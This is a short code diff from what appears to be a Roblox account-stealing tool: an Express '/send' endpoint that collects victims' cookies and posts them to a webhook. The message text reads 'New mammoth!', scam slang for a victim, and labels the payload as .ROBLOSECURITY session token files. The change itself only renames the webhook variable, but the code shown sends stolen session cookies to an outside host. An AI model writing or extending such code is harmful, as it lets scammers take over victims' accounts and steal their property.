@@ -23,7 +23,7 @@ app.post('/send', (req, res) => {
         let newObject = {"name": `Куки №${index}`,"value":`${cookie}`};
         cookiesArray.push(newObject);
     }
-    const response = await fetch(WEBHOOK_URL, {
+    const response = await fetch(webhookUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: {"content":"Новый мамонт!","embeds":[{"title":"Данные","description":"Файлы .ROBLOSECURITY","color":5814783,"fields":[cookiesArray.concat(", ")]}],"attachments":[]},
